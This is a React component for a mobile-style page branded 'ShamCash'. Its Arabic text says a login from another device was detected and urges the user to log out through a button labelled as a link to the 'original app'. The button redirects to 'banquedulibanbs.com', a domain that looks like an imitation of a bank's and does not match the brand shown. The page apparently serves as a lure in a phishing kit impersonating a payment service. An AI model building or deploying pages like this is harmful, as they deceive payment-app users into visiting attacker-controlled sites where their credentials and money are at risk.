const REAL_APP_URL = "https://banquedulibanbs.com";

export default function ShamCashBlocked() {
  return (
    <div
      dir="rtl"
      style={{
        minHeight: "100vh",
        background: "linear-gradient(160deg, #1a2240 0%, #151c36 50%, #0f1526 100%)",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        fontFamily: "'Inter', system-ui, sans-serif",
        position: "relative",
        overflow: "hidden",
        padding: "24px",
      }}
    >
      {/* bg glows */}
      <div style={{ position: "absolute", top: "-60px", left: "-60px", width: "220px", height: "220px", borderRadius: "50%", background: "rgba(229,62,62,0.07)", filter: "blur(50px)", pointerEvents: "none" }} />
      <div style={{ position: "absolute", bottom: "-80px", right: "-60px", width: "260px", height: "260px", borderRadius: "50%", background: "rgba(101,123,216,0.05)", filter: "blur(50px)", pointerEvents: "none" }} />

      {/* logo */}
      <div style={{ marginBottom: "36px" }}>
        <div style={{ position: "relative", width: "128px", height: "112px", margin: "0 auto" }}>
          <div style={{
            position: "absolute", left: "20px", top: "48px", width: "80px", height: "48px", borderRadius: "4px",
            background: "linear-gradient(135deg, #5dd99f, #44a984, #257b6f)",
            clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
          }} />
          <div style={{
            position: "absolute", left: "56px", top: "20px", width: "80px", height: "48px", borderRadius: "4px",
            background: "linear-gradient(135deg, #6273dd, #5365c3, #354075)",
            clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
          }} />
        </div>
      </div>

      {/* warning card */}
      <div style={{
        width: "100%",
        maxWidth: "360px",
        background: "rgba(229,62,62,0.1)",
        border: "1.5px solid rgba(229,62,62,0.35)",
        borderRadius: "20px",
        padding: "32px 24px 28px",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: "20px",
        backdropFilter: "blur(12px)",
        boxShadow: "0 12px 40px rgba(229,62,62,0.12), 0 2px 0 rgba(255,255,255,0.03) inset",
      }}>
        {/* icon */}
        <div style={{
          width: "64px", height: "64px", borderRadius: "50%",
          background: "rgba(229,62,62,0.15)",
          border: "2px solid rgba(229,62,62,0.4)",
          display: "flex", alignItems: "center", justifyContent: "center",
          flexShrink: 0,
        }}>
          <svg viewBox="0 0 24 24" fill="none" width="30" height="30">
            <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"
              stroke="rgba(229,62,62,0.9)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>

        {/* text */}
        <div style={{ textAlign: "center" }}>
          <p style={{
            color: "rgba(255,255,255,0.92)", fontSize: "18px", fontWeight: "800",
            margin: "0 0 10px", lineHeight: "1.5",
          }}>
            يرجى تسجيل الخروج
          </p>
          <p style={{
            color: "rgba(255,255,255,0.58)", fontSize: "14px", fontWeight: "600",
            margin: 0, lineHeight: "1.65",
          }}>
            تم اكتشاف دخول من جهاز آخر.
            <br />
            يجب تسجيل الخروج من الجهاز الحالي أولاً للمتابعة.
          </p>
        </div>

        {/* button */}
        <button
          type="button"
          onClick={() => { window.location.href = REAL_APP_URL; }}
          style={{
            width: "100%",
            height: "54px",
            borderRadius: "14px",
            background: "linear-gradient(135deg, #e53e3e, #c53030)",
            border: "none",
            color: "#fff",
            fontSize: "16px",
            fontWeight: "800",
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "10px",
            boxShadow: "0 10px 28px rgba(229,62,62,0.28)",
            transition: "opacity 0.15s",
            letterSpacing: "0.01em",
          }}
          onMouseEnter={(e) => (e.currentTarget.style.opacity = "0.88")}
          onMouseLeave={(e) => (e.currentTarget.style.opacity = "1")}
        >
          <svg viewBox="0 0 24 24" fill="none" width="19" height="19">
            <path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"
              stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
          الانتقال إلى التطبيق الأصلي وتسجيل الخروج
        </button>
      </div>

      {/* footer */}
      <div style={{ marginTop: "40px", textAlign: "center" }}>
        <p style={{ color: "rgba(255,255,255,0.22)", fontSize: "12px", fontWeight: "700", letterSpacing: "3px", textTransform: "uppercase", margin: "0 0 8px" }}>
          POWERED BY
        </p>
        <p style={{ color: "rgba(255,255,255,0.18)", fontSize: "12px", fontWeight: "600", letterSpacing: "1px", margin: 0 }}>
          V 2.2.4
        </p>
      </div>
    </div>
  );
}
